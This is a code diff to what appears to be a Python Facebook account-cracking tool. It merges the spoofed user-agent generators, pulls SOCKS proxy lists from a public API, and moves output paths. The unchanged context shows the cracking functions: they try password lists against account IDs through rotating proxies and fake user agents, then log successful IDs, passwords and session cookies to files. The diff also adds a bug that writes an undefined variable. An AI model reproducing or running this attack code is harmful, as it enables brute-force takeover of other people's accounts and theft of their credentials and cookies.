@@ -118,7 +118,7 @@ for t in range(10000):
 	_9=f'Mozilla/5.0 (Linux; Android {a}; {random9} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
 	_10=f'Mozilla/5.0 (Windows NT {a}; {random10} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
 	uakuh = random.choice([_1,_2,_3,_4,_5,_6,_7,_8,_9,_10])
-	ugen2.append(uakuh)
+	ugen.append(uakuh)
 	
 	###----------[ GENERATE USERAGENT ]---------- ###
 for xd in range(10000) :
@@ -240,7 +240,7 @@ for xd in range(10000):
 	d=random.randrange(4200,4900)
 	e=random.randrange(40,150)
 	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-	ugen2.append(uaku)
+	ugen.append(uaku)
 
 for t in range(10000):
 	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
@@ -276,7 +276,7 @@ for xd in range(10000):
 	j=random.randrange(1, 4)
 	k='Mobile UNTRUSTED/1.0'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
+	ugen.append(uaku)
 
 
 	aa='Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
@@ -347,11 +347,11 @@ for xd in range(10000):
 	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
 	ugen.append(uga) 
 try:
-	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-	open('socksku.txt','w').write(proxylist)
+	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
+	open('prox.txt','w').write(prox)
 except Exception as e:
 	baz_anim(f'gagal ster :(')
-proxsi=open('socksku.txt','r').read().splitlines()
+proxsi=open('prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Linux; Tizen'
 	b=random.randrange(1, 9)
@@ -1390,7 +1390,7 @@ def passwrd():
 		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
 		time.sleep(2)
 		exit()
-		def tahun(fx):
+def tahun(fx):
 	if len(fx)==15:
 		if fx[:10] in ['1000000000']       :tahunz = '2009'
 		elif fx[:9] in ['100000000']       :tahunz = '2009'
@@ -1425,7 +1425,6 @@ def crack(idf,pwv):
 	sys.stdout.write(f"\r🔥 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1460,7 +1459,7 @@ def crackfree(idf,pwv):
 	sys.stdout.write(f"\r🔥 {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(['Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A426B/A426BXXS4DVK5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36'])
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1503,7 +1502,6 @@ def cracktouch(idf,pwv):
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
@@ -1524,7 +1522,7 @@ def cracktouch(idf,pwv):
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='AOREC-XD CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1534,7 +1532,7 @@ def cracktouch(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
@@ -1544,7 +1542,7 @@ def cracktouch(idf,pwv):
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1586,7 +1584,6 @@ def crackmbasic(idf,pwv):
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
@@ -1607,7 +1604,7 @@ def crackmbasic(idf,pwv):
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='AOREC-XD CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1617,7 +1614,7 @@ def crackmbasic(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
@@ -1627,7 +1624,7 @@ def crackmbasic(idf,pwv):
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -2300,11 +2297,11 @@ class sxp_wa:
 if __name__=='__main__':
 	try:os.system('git pull')
 	except:pass
-	try:os.mkdir('sdcard/OK')
+	try:os.mkdir('OK')
 	except:pass
-	try:os.mkdir('srcard/CP')
+	try:os.mkdir('CP')
 	except:pass
-	try:os.mkdir('sdcard/DUMP')
+	try:os.mkdir('/sdcard/DUMP')
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
